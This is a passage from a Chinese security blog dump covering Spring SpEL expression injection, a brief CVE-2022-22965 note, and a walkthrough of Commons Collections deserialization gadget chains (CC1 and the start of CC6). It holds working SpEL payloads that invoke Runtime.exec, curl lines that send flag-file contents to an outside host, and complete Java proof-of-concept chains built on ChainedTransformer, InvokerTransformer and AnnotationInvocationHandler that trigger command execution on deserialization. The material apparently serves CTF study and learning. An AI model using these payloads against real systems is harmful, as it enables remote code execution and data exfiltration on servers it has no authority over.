SpelExpressionParser(); &#x2F;&#x2F;解析器解析字符串表达式 Expression expression &#x3D; parser.parseExpression(&quot;(&#39;Hello&#39; + &#39; Mi1k7ea&#39;).concat(#end)&quot;); &#x2F;&#x2F;构造上下文,可以不写，默认存在。但是默认的实例不会包含任何自定义的变量或函数。因此，如果表达式需要引用自定义的变量或函数，还是需要定义的。（这里的自定义变量和函数是指例如#root和#this变量，以及一些基本的函数，如toString()和getClass()函数，而不是在前边自己定义的字符串 EvaluationContext context &#x3D; new StandardEvaluationContext(); context.setVariable(&quot;end&quot;, &quot;!&quot;); &#x2F;&#x2F;通过 Expression 接口的 getValue 方法根据上下文获得表达式值 System.out.println(expression.getValue(context)); 使用”T(Type)”来表示 java.lang.Class 实例，”Type”必须是类全限定名，”java.lang”包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段。 所以可以借这个方式来调用exec 检测方法全局搜索org.springframework.expression.spel.standard或expression.getValue()、expression.setValue()，再分析代码中传入的参数是否可控。 利用正常Windows本地利用反射方式弹计算器 String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;exec&quot;,String[].class).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)), (Object) new String[]&#123;&quot;cmd&quot;,&quot;&#x2F;C&quot;,&quot;calc&quot;&#125;); （原博客这里getMethod的参数是String.class，后面还穿了个字符数组类型的，怎么可能跑起来啊 使用spEL的方式 主要就是加个T（） 正常就是： T(java.lang.Runtime).getRuntime().exec(&#39;curl yourip:port&#x2F;?c&#x3D;&#96;cat flag&#96;&#39;) 还可以用的StreamUtils包的copy()方法实现输入输出流来构造回显exp即可。 T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(&#39;cat flag.txt&#39;).getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()) 这个StreamUtils包是spring里的，如果maven的pom.xml里导入了 org.springframework.boot spring-boot-starter-web 或者导入了 org.springframework spring-core 5.3.9 并且还有 org.springframework spring-web 5.3.1 就可以试试去利用这个包整点有回显的文件读取 如果有过滤可以试试反射的方式 import org.springframework.expression.Expression; import org.springframework.expression.ExpressionParser; import org.springframework.expression.ParserContext; import org.springframework.expression.common.TemplateParserContext; import org.springframework.expression.spel.standard.SpelExpressionParser; import org.springframework.expression.spel.support.StandardEvaluationContext; import java.lang.reflect.InvocationTargetException; public class calc &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123; &#x2F;&#x2F;创建一个SpEL表达式解析器。 ExpressionParser parser &#x3D; new SpelExpressionParser(); String test &#x3D; &quot;#&#123;T(String).getClass().forName(\\&quot;java.l\\&quot;+\\&quot;ang.Ru\\&quot;+\\&quot;ntime\\&quot;).getMethod(\\&quot;ex\\&quot;+\\&quot;ec\\&quot;,T(String[])).invoke(T(String).getClass().forName(\\&quot;java.l\\&quot;+\\&quot;ang.Ru\\&quot;+\\&quot;ntime\\&quot;).getMethod(\\&quot;getRu\\&quot;+\\&quot;ntime\\&quot;).invoke(T(String).getClass().forName(\\&quot;java.l\\&quot;+\\&quot;ang.Ru\\&quot;+\\&quot;ntime\\&quot;)),new String[]&#123;\\&quot;cmd\\&quot;,\\&quot;&#x2F;C\\&quot;,\\&quot;calc\\&quot;&#125;)&#125;&quot;; &#x2F;&#x2F;创建一个模板解析上下文。不传入的话会有默认的解析器，但是只支持一些基本的表达式，比如简单的算术运算、字符串操作、逻辑运算等等 ParserContext parserContext &#x3D; new TemplateParserContext(); Expression exp &#x3D; parser.parseExpression(test,parserContext); StandardEvaluationContext evaluationContext &#x3D; new StandardEvaluationContext(); exp.getValue(evaluationContext).toString(); &#125; &#125; 然后这里还有几种其他的方式Javaweb安全——表达式注入（EL+SpEL）_Arnoldqqq的博客-CSDN博客 这里其实有个例题是p牛的javacon，但是我不想做（ 看上面的参考文章吧，顺便说一下看wp得到的一个curl外带的技巧 curl fg5hme.ceye.io&#x2F;&#96;cat flag_j4v4_chun|base64|tr &#39;\\n&#39; &#39;-&#39;&#96; 把带出来的东西base64编码，然后用tr把换行替换成-，解决了curl外带只能带一行的问题","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://ethe448.github.io/tags/Java/"}]},{"title":"CVE-2022-22965","slug":"CVE-2022-22965","date":"2023-04-10T08:28:25.000Z","updated":"2023-05-16T15:32:40.430Z","comments":true,"path":"2023/04/10/CVE-2022-22965/","link":"","permalink":"https://ethe448.github.io/2023/04/10/CVE-2022-22965/","excerpt":"","text":"漏洞名称CVE-2022-22965：Spring Framework远程代码执行漏洞 漏洞编号：CVE-2022-22965 漏洞说明Spring framework 是Spring 里面的一个基础开源框架，其目的是用于简化 Java 企业级应用的开发难度和开发周期,2022年3月31日，VMware Tanzu发布漏洞报告，Spring Framework存在远程代码执行漏洞，在 JDK 9+ 上运行的 Spring MVC 或 Spring WebFlux 应用程序可能容易受到通过数据绑定的远程代码执行 (RCE) 的攻击。 漏洞影响范围： Spring Framework &lt; 5.3.18 Spring Framework &lt; 5.2.20","categories":[],"tags":[]},{"title":"CommonsCollections反序列化链","slug":"CommonsCollections反序列化链","date":"2023-03-19T08:24:25.000Z","updated":"2023-05-22T02:02:54.598Z","comments":true,"path":"2023/03/19/CommonsCollections反序列化链/","link":"","permalink":"https://ethe448.github.io/2023/03/19/CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/","excerpt":"","text":"Commons CollectionsApache Commons Collections包和简介 | 闪烁之狐 (blinkfox.github.io) 背景介绍Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。 Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。 Collections的包结构和简单介绍 org.apache.commons.collections – CommonsCollections自定义的一组公用的接口和工具类 org.apache.commons.collections.bag – 实现Bag接口的一组类 org.apache.commons.collections.bidimap – 实现BidiMap系列接口的一组类 org.apache.commons.collections.buffer – 实现Buffer接口的一组类 org.apache.commons.collections.collection –实现java.util.Collection接口的一组类 org.apache.commons.collections.comparators– 实现java.util.Comparator接口的一组类 org.apache.commons.collections.functors –Commons Collections自定义的一组功能类 org.apache.commons.collections.iterators – 实现java.util.Iterator接口的一组类 org.apache.commons.collections.keyvalue – 实现集合和键/值映射相关的一组类 org.apache.commons.collections.list – 实现java.util.List接口的一组类 org.apache.commons.collections.map – 实现Map系列接口的一组类 org.apache.commons.collections.set – 实现Set系列接口的一组类 * *********** 常用类 *********** * 1. org.apache.commons.collections4.CollectionUtils * isEmpty 判断集合是否为空 * isNotEmpty 判断集合不为空 * isEqualCollection 比较两集合值是否相等, 不考虑元素的顺序 * union 并集, 不会去除重复元素 * intersection 交集 * disjunction 交集的补集 * subtract 差集, 不去重 * unmodifiableCollection 得到一个集合镜像，不允许修改，否则报错 * containsAny 判断两个集合是否有相同元素 * getCardinalityMap 统计集合中各元素出现的次数，并以Map&lt;Object, Integer&gt;输出 * isSubCollection a是否 b 的子集合, a集合大小 &lt;&#x3D; b集合大小 * isProperSubCollection a是否 b 的子集合, a集合大小 &lt; b集合大小 * cardinality 某元素在集合中出现的次数 * find 返回集合中满足函数式的唯一元素，只返回最先处理符合条件的唯一元素, 以废弃 * filter 过滤集合中满足函数式的所有元素 * transform 转换新的集合，对集合中元素进行操作，如每个元素都累加1 * countMatches 返回集合中满足函数式的数量 * select 将满足表达式的元素存入新集合中并返回新集合元素对象 * selectRejected 将不满足表达式的元素存入新集合中并返回新集合元素对象 * collect collect底层调用的transform方法, 将所有元素进行处理，并返回新的集合 * addAll 将一个数组或集合中的元素全部添加到另一个集合中 * get 返回集合中指定下标元素 * isFull 判断集合是否为空 * maxSize 返回集合最大空间 * predicatedCollection 只要集合中元素不满足表达式就抛出异常 * removeAll 删除集合的子集合 * synchronizedCollection 同步集合 * * 2. org.apache.commons.collections4.MapUtils * isEmpty 判断Map是否为空 * isNotEmpty 判断Map是否不为空 * getBoolean 从Map中获取 Boolean, 其重载方法有三个参数, 表示如果转换失败则使用默认值 * getBooleanValue 从Map中获取 boolean, 其重载方法有三个参数, 表示如果转换失败则使用默认值 * getDouble 从Map中获取 Double, 其重载方法有三个参数, 表示如果转换失败则使用默认值 * getDoubleValue 从Map中获取 double, 其重载方法有三个参数, 表示如果转换失败则使用默认值 * getFloat 从Map中获取 Float, 其重载方法有三个参数, 表示如果转换失败则使用默认值 * getFloatValue 从Map中获取 float, 其重载方法有三个参数, 表示如果转换失败则使用默认值 * getInteger 从Map中获取 Integer, 其重载方法有三个参数, 表示如果转换失败则使用默认值 * getIntegerValue 从Map中获取 int, 其重载方法有三个参数, 表示如果转换失败则使用默认值 * getLong 从Map中获取 Long, 其重载方法有三个参数, 表示如果转换失败则使用默认值 * getLongValue 从Map中获取 long, 其重载方法有三个参数, 表示如果转换失败则使用默认值 * getString 从Map中获取 String, 其重载方法有三个参数, 表示如果转换失败则使用默认值 * getMap 获取Map类型的值 * putAll 将二维数组放入Map中 * *&#x2F; CC1关于cc1的反序列化，网上一般有两条链子，一个就是ysoserial中的lazymap链，还有transformedmap链 环境搭建 JDK8u65（高版本jdk中AnnotationinvocationHandler的readObject被重写了 [openJDK 8u65](jdk8u/jdk8u/jdk: af660750b2f4 (openjdk.org)) Maven 后面的具体配置可以看Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili和Java反序列化Commons-Collections篇01-CC1链 | 芜风 (drun1baby.top) 执行类分析我们要先了解一下在cc1里实现了Transformer接口的几个方法 ChainedTransformer：输入对象将传递给第一个转换器。转换后的结果将传递给第二个转换器，依此类推。类似递归的操作，每次转换的输出结果将作为下一次转换的输入。 InvokerTransformer：通过反射创建新的对象实例的转换器实现。InvokerTransformer 是 Apache Commons Collections 库中的一个类，它可以通过反射机制调用指定对象的指定方法，并返回方法执行结果。它是一个转换器（Transformer）实现，用于将输入对象转换为调用指定方法后的返回值。 InvokeTransformer重写的transform函数是cc1链的关键点 ConstantTransformer ：它是一个转换器（Transformer）实现，用于将输入对象转换为一个固定的常量值。 这里我们先重点说一下InvokerTransformer InvokerTransformer的有参构造需要三个参数 这三个参数在transform方法里都有用到，从这里我们能分别看出这三个函数的作用。methodName是需要获取的方法名，paramTypes是这个方法的参数类型，args参数则是它的参数列表。同时input也是transform的形参，也就是说是，我们可以利用InvokerTransformer.transform以反射的方式去调用一些其他的方法 然后我们试着去调用Runtime 首先正常使用是 Runtime.getRuntime().exec(&quot;calc&quot;); 通过反射则是 Runtime runtime &#x3D; Runtime.getRuntime(); &#x2F;&#x2F;获得类对象 Class r &#x3D; Runtime.class; &#x2F;&#x2F;获得exec方法 Method exec &#x3D; r.getMethod(&quot;exec&quot;, String.class); &#x2F;&#x2F;执行calc命令 exec.invoke(runtime,&quot;calc&quot;); 利用InvokerTransformer.transform执行命令 Runtime runtime &#x3D; Runtime.getRuntime(); new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime); 那么假设我们在序列化中传入了InvokerTransformer类，如果在反序列化的过程中，有能够触发transform的地方，不就可以实现命令执行了吗？ 现在我们已经找完反序列化中的执行类了，接下来就需要去找有没有哪里调用了transform 这里能够利用的地方一共有两处，分别是LazyMap和TransformedMap，这也造成了cc1的两条链 TransformedMap链分析&#x2F;&#x2F;transformValue方法 protected Object transformValue(Object object) &#123; if (valueTransformer &#x3D;&#x3D; null) &#123; return object; &#125; return valueTransformer.transform(object); &#125; &#x2F;&#x2F;checkSetValue方法 protected Object checkSetValue(Object value) &#123; return valueTransformer.transform(value); &#125; &#x2F;&#x2F;transformKey方法 protected Object transformKey(Object object) &#123; if (keyTransformer &#x3D;&#x3D; null) &#123; return object; &#125; return keyTransformer.transform(object); &#125; 这三处调用transform的方法其实根本上都差不多，都是调用keyTransformer或valueTransformer的transform方法，而keyTransformer和valueTransformer在构造函数中都进行了赋值 TransformedMap：TransformedMap 是 Apache Commons Collections 框架中的一个类，它实现了一个 Map 接口，可以对其所包含的键值对进行转换操作。可以在原有的 Map 对象的基础上，提供一种能够对键或值进行自定义转换的方式。具体来说，TransformedMap 实例将会对 get、put 和 containsKey 方法进行重载，从而在访问 Map 中的键值对时，通过指定的转换器来对键或值进行转换操作。 这个构造方法是protected类型的，所以类中肯定还有其他方法调用了这个构造方法 decorate这个静态方法我们可以很方便的调用，接下来只要找到有调用checkSetValue、transformValue、transformKey三个方法其中之一的我们可以利用的函数就也可以执行命令了。 满足这个条件的其实在TransformedMap 下就有一个 调用了transformValue和transformKey，利用这个我们可以再写出一种在不直接调用InvokerTransformer.transform方法的命令执行路径 Runtime runtime &#x3D; Runtime.getRuntime(); InvokerTransformer exec &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); HashMap map &#x3D; new HashMap(); &#x2F;&#x2F;可以触发两次&#x2F;&#x2F;将keyTransformer和valueTransformer都成为exec，实际上put之后就会变成transform(exec) Map decorate &#x3D; TransformedMap.decorate(map, exec, exec); Object calc &#x3D; decorate.put(runtime, runtime); 如果我们能再找到调用了put方法的函数，可能也能找到一条反序列化的利用链。 不过这和我们的TransformedMap 链没有关系，我们要利用的是第三个函数checkSetValue， 在AbstractInputCheckedMapDecorator抽象类中的一个静态类MapEntry中的setValue方法中就调用了checkSetValue方法 那接下来我们就需要去找哪里能够触发AbstractInputCheckedMapDecorator.MapEntry.setValue() MapEntry是AbstractMapEntryDecorator的子类，而AbstractMapEntryDecorator又实现了Map.Entry接口，可以看出MapEntry中的setValue方法其实就是Entry中的setValue方法的重写 当 TransformedMap执行transformedMap.entrySet()得到的entry[]数组元素都是AbstractInputCheckedMapDecorator类的对象, 可以通过执行以下代码,在entry.setValue打断点确认entry的类型 public class test &#123; public static void main(String[] args) &#123; Runtime runtime &#x3D; Runtime.getRuntime(); HashMap&lt;Object, Object&gt; map &#x3D; new HashMap&lt;&gt;(); map.put(&quot;set_key&quot;, &quot;set_value&quot;); Transformer invokerTransformer &#x3D;new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);; Map&lt;Object, Object&gt; transformedMap &#x3D; TransformedMap.decorate(map, null, invokerTransformer); for (Map.Entry entry : transformedMap.entrySet()) &#123; entry.setValue(runtime); &#125; &#125; &#125; 这里entry是AbstractInputCheckedMapDecorator类型的，所以这里的setValue()实际上就是在 Map 中对一组 entry（键值对）进行setValue()操作。 所以触发AbstractInputCheckedMapDecorator.MapEntry.setValue()的方式我们也清楚了，对Map进行遍历并调用setValue就可以了 而在AnnotationinvocationHandler的readObject方法中，恰好有这样一个既遍历了Map，又对Map.Entry调用了setValue方法 我们再看一下AnnotationinvocationHandler 在构造方法中需要两个参数，一个是继承了Annotation的类对象，另一个是Map类型的值，这个map就是我们调用TransformedMap.decorate后返回的数值。 而且由于这个类不是public类型的，所以需要利用反射去实例化 到这里我们的整个利用链就已经可以整理出来了 入口类是AnnotationinvocationHandler 执行类是InvokerTransformer AnnotationinvocationHandler -&gt; readObject AbstractInputCheckedMapDecorator.MapEntry -&gt; setValue TransformedMap -&gt; checkSetValue InvokerTransformer -&gt; transform 完善我们找到了入口类，利用链，执行类，看起来已经完美了，但是仍存在一些问题需要我们去解决 首先，Runtime对象是我们自己生成的，不能进行序列化 其次，AnnotationinvocationHandler 的readObject函数中还有两个if判断需要我们去解决 最后，setValue中的内容应该是我们要调用的对象，而不是 new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name)) 一、Runtime不能进行序列化如果Runtime不能序列化，那么我们想要执行的命令也就无法进行序列化，不能通过反序列化达到命令执行的目的 但是，虽然Runtime不能进行序列化，可Runtime.class可以 所以我们同样可以利用反射和InvokerTransformer.transform方法达到能够将我们想要执行的命令进行序列化的目的 &#x2F;&#x2F; Class&lt;Runtime&gt; rc &#x3D; Runtime.class; &#x2F;&#x2F; Method getRuntime &#x3D; rc.getMethod(&quot;getRuntime&quot;); Method getMethod &#x3D; (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class); &#x2F;&#x2F; Runtime runtime &#x3D; (Runtime)getRuntime.invoke(null);&#x2F;&#x2F;getRuntime是静态方法，所以invoke的第一个参数可以写null Runtime runtime &#x3D; (Runtime)new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getMethod); &#x2F;&#x2F; runtime.exec(&quot;calc&quot;) new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime); 这里可以看到其实我们真正需要输入的只有Runtime.class，剩下的都是前一个的输出，所以这里我们可以借助之前提的ChainedTransformer进行简化 Transformer[] t &#x3D; new Transformer[]&#123; new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),&#x2F;&#x2F;获得getMethod方法 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),&#x2F;&#x2F;相当于getRuntime.invoke(null)，产生一个实例化的Runtime类型对象r new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;;&#x2F;&#x2F;执行r.exec(&quot;calc&quot;) &#x2F;&#x2F;在InvokeTransformer中相当于 &#x2F;&#x2F;Method method &#x3D; r.getClass().getMethod(exec, String.class); &#x2F;&#x2F;return method.invoke(r, calc); ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t); chainedTransformer.transform(Runtime.class); 二、绕过readObject函数中的两个if判断首先我们创建的hashmap里需要有值，不然memberValues为0，for循环也不会进入 第一个if判断，获取的是我们传入的注解的类里的成员方法，同时Hashmap里的key要和成员方法的名一样 但是Override里并没有成员变量 public @interface Override &#123; &#125; 所以我们需要换一个，例如Target 这时候就能满足第一个if判断了 而第二个判断是否存在的也肯定满足，因此这个问题也解决了 三、setValue中的内容应该是我们要调用的对象我们已经知道如果想达到命令执行的目的，必须有这样一个调用方式 chainedTransformer.transform(Runtime.class); 但是现在我们调试时可以看到 setValue里的参数是 new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name)) 这时valueTransformers已经是是我们构造的ChainedTransformer，但value参数并不是我们想要的 Runtime.class 因此这里还需要借助ConstantTransformer，它能将输入对象转换为一个固定的常量值 也就是假设我们将Transformer数组的第一位加上new ConstantTransformer(Runtime.class)，也就相当于我们给ConstantTransformer返回的iConstant值设置为了Runtime.class 那么在执行到TransformedMap里的checkSetValue时，第一次的chainedTransformer.transform调用的是ConstantTransformer的transform，返回的内容是固定的Runtime.class，实质上就是相当于将第二次调用transform的value赋值成了Runtime.class，满足了我们想要的chainedTransformer.transform(Runtime.class) 完整的poc为 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class Main &#123; public static void main(String[] args) throws IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, ClassNotFoundException &#123; Transformer[] t &#x3D; new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t); &#x2F;&#x2F; InvokerTransformer exec &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); HashMap map &#x3D; new HashMap(); map.put(&quot;value&quot;,&quot;value&quot;); Map decorate &#x3D; TransformedMap.decorate(map, null, chainedTransformer); &#x2F;&#x2F; &#x2F;&#x2F;创建AnnotationinvocationHandler的类对象 Class&lt;?&gt; AIH_construct &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); &#x2F;&#x2F;获取构造方法 Constructor&lt;?&gt; declaredConstructor &#x3D; AIH_construct.getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); Object o &#x3D; declaredConstructor.newInstance(Target.class, decorate); ser(o); unser(); &#125; public static void ser(Object obj) throws IOException &#123; ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;))); oos.writeObject(obj); &#125; public static void unser() throws IOException, ClassNotFoundException &#123; ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;))); oi.readObject(); &#125; &#125; 总结入口类是AnnotationinvocationHandler 执行类是InvokerTransformer 利用链是 AnnotationinvocationHandler.readObject AbstractInputCheckedMapDecorator.MapEntry.setValue TransformedMap.checkSetValue InvokerTransformer.transform 使用到的工具类辅助利用链： ConstantTransformer ChainedTransformer HashMap LazyMap链刚才我们分析完了TransformedMap链，接下来再来看LazyMap 分析LazyMap类中的get方法调用了transform方法 public Object get(Object key) &#123; &#x2F;&#x2F; create value for key if key is not currently in the map if (map.containsKey(key) &#x3D;&#x3D; false) &#123; Object value &#x3D; factory.transform(key); map.put(key, value); return value; &#125; return map.get(key); &#125; map中的containKey(key)方法是判断Map 集合对象中是否包含指定的键名。如果存在则返回true,反之,返回false 如果我们能让factory是InvokerTransformer 类，并且key为Runtime.class的话，也同样能完成命令执行的目的 先看一下factory的赋值过程 通过静态的decorate调用protected类型的构造方法 public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory); &#125; 这里两个参数和Transformed一样，所以要传的东西也一样，这里可以试着触发一下 HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;(); Transformer[] t &#x3D; new Transformer[]&#123; &#x2F;&#x2F; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t); Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap, chainedTransformer); decorate.get(Runtime.class); 上面我们是手动调用的get方法，但是实际上并不会有给我们手动调用get方法的机会，因此我们就要找一个能触发get的方法了 还是我们熟悉的AnnotationInvocationHandler类，里面的invoke方法正好调用了get 而memberValues属性的值也是在构造方法里进行的赋值，是可控的 那要再考虑如何调用invoke 还记得我们提到过的动态代理吗？ 要实现动态代理需要有一个实现了InvocationHandler接口的对象，而这个AnnotationInvocationHandler中恰好实现了InvocationHandler接口，动态代理会自动调用实现了InvocationHandler接口的对象中的invoke方法，于是我们可以使用动态代理的方法来调用invoke方法 &#x2F;&#x2F; 因为AnnotationInvocationHandler不是public的，所以需要通过反射去实例化 Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; declaredConstructor &#x3D; aClass.getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); &#x2F;&#x2F;decorate 就是LazyMap.decorate返回的那个map变量。这时候memverValue就是我们构造好的Map了 InvocationHandler handler &#x3D; (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate); &#x2F;&#x2F; 构造动态代理 Map proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler); 接下来去找我们的入口点，还是在AnnotationInvocationHandler的readObject 中，由于动态代理的缘故， 只要memberValue是我们构造的动态代理，就会在执行memberValues.entrySet前，先调用invoke方法，触发我们的调用链 所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹。 Object invocationHandler &#x3D; declaredConstructor.newInstance(Override.class, proxyMap); 完整的poc为 package org.LazyMapSer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Proxy; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class main &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123; HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;(); Transformer[] t &#x3D; new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t); Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap, chainedTransformer); &#x2F;&#x2F; decorate.get(Runtime.class); Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; declaredConstructor &#x3D; aClass.getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); InvocationHandler handler &#x3D; (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate); Object proxyMap &#x3D; Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler); Object invocationHandler &#x3D; declaredConstructor.newInstance(Override.class, proxyMap); ser(invocationHandler); unser(); &#125; public static void ser(Object obj) throws IOException &#123; ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;))); oos.writeObject(obj); &#125; public static void unser() throws IOException, ClassNotFoundException &#123; ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;))); oi.readObject(); &#125; &#125; 总结入口类和执行类和TransformedMap链一样没变 入口类是AnnotationinvocationHandler 执行类是InvokerTransformer 调用链是： AnnotationinvocationHandler.readObject ​ memberValues.entrySet() AnnotationinvocationHandler.invoke LazyMap.get ​ ChainedTransformer.transform() ​ ConstantTransformer.transform() InvokerTransformer.transform 使用到的工具类辅助利用链： ConstantTransformer ChainedTransformer HashMap Proxy CC6分析 先说一些前置知识 由于cc1的两条链都利用了AnnotationinvocationHandler中的readObject方法，导致在高版本的jdk中由于AnnotationinvocationHandler的readObject方法的修改而无法进行利用。但cc6的链并没有版本限制。 TiredMapEntry类官方的介绍是这可用于使映射条目能够在基础映射上进行更改，没太看懂，但是具体的效果是把输入的Map对象和Object对象以key=value的形式输出出来，Object对象是key。 对LazyMap类中的get方法选择的不同的函数造成了CC1的另一条LazyMap链 在TiredMapEntry中也有一个调用get的方法，这条链被叫做CC6 恰好这个map和key也是在构造函数里赋值的，是我们可以控制的 那么假设map是LazyMap类型，key是Runtime.class，就同样可以实现调用LazyMap.get()的目的了 接下来要去找哪里调用了getValue函数 同样是在TiredMapEntry类，hashCode函数 可以手动调一下，前半部分和之前都一样 HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;(); Transformer[] t &#x3D; new Transformer[]&#123; &#x2F;&#x2F; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t); Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap, chainedTransformer); TiedMapEntry 